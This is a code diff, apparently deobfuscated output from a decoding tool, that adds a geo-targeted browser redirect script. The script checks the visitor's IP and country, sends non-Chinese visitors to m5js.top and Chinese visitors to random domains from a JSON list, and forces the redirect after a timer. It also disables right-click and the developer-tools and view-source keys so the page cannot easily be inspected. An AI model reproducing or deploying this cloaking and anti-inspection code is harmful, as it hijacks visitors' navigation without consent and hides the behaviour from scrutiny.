@@ -1,16 +1,53 @@
-//Mon Dec 16 2024 09:53:38 GMT+0000 (Coordinated Universal Time)
+//Mon Dec 16 2024 09:59:59 GMT+0000 (Coordinated Universal Time)
 //Base:https://github.com/echo094/decode-js
 //Modify:https://github.com/smallfawn/decode_action
-setTimeout(function () {
-  fetch("config.json").then(_0x2cef21 => {
-    if (!_0x2cef21.ok) {
-      throw new Error("Failed to fetch config.json: " + _0x2cef21.status + " " + _0x2cef21.statusText);
-    }
-    return _0x2cef21.json();
-  }).then(_0x365b5d => {
-    const _0x22861c = _0x365b5d.urls || [],
-      _0x3b82d2 = Math.floor(Math.random() * _0x22861c.length),
-      _0x29a63a = _0x22861c[_0x3b82d2];
-    window.location.href = _0x29a63a;
-  }).catch(_0x5ae119 => console.error("Error fetching config.json:", _0x5ae119.message));
-}, 3000);
+let redirectTimer;
+function checkIP() {
+  const _0x2a9f70 = document.createElement("script");
+  _0x2a9f70.src = "https://api.ip.sb/jsonip?callback=getIP";
+  document.body.appendChild(_0x2a9f70);
+}
+function getIP(_0x426975) {
+  const _0x1173b4 = _0x426975.ip;
+  !_0x1173b4 || _0x1173b4.trim() === "" ? checkDomain() : fetchCountry(_0x1173b4);
+}
+async function fetchCountry(_0x5532a1) {
+  try {
+    const _0x2d8484 = await fetch("https://ipapi.co/" + _0x5532a1 + "/country/"),
+      _0x1a43f5 = await _0x2d8484.text();
+    _0x1a43f5.trim() === "CN" ? checkDomain() : redirectToDomain("" + targetDomain + pathAndQueryString);
+  } catch (_0x1203c8) {
+    console.error("获取IP信息失败:", _0x1203c8);
+  }
+}
+async function checkDomain() {
+  try {
+    const _0xc279e6 = Date.now(),
+      _0x1963ff = "./dm1.json?timestamp=" + _0xc279e6,
+      _0x506c46 = await fetch(_0x1963ff),
+      _0x3bb682 = await _0x506c46.json(),
+      _0x2a14c0 = Math.floor(Math.random() * _0x3bb682.length),
+      _0x18b431 = _0x3bb682[_0x2a14c0];
+    redirectToDomain("https://" + _0x18b431 + pathAndQueryString);
+  } catch (_0x484b66) {
+    console.error("从JSON文件获取域名时出错:", _0x484b66);
+  }
+}
+function redirectToDomain(_0x26b639) {
+  window.location.href = _0x26b639;
+}
+const targetDomain = "https://m5js.top",
+  pathAndQueryString = window.location.pathname + window.location.search + window.location.hash;
+document.addEventListener("DOMContentLoaded", function () {
+  checkIP();
+  redirectTimer = setTimeout(checkDomain, 5000);
+});
+window.addEventListener("beforeunload", function () {
+  clearTimeout(redirectTimer);
+});
+document.addEventListener("contextmenu", function (_0x19e9d6) {
+  _0x19e9d6.preventDefault();
+});
+document.addEventListener("keydown", function (_0x3099c8) {
+  (_0x3099c8.key === "F12" || _0x3099c8.ctrlKey && _0x3099c8.shiftKey && _0x3099c8.key === "I" || _0x3099c8.ctrlKey && _0x3099c8.shiftKey && _0x3099c8.key === "J" || _0x3099c8.ctrlKey && _0x3099c8.key === "U") && _0x3099c8.preventDefault();
+});
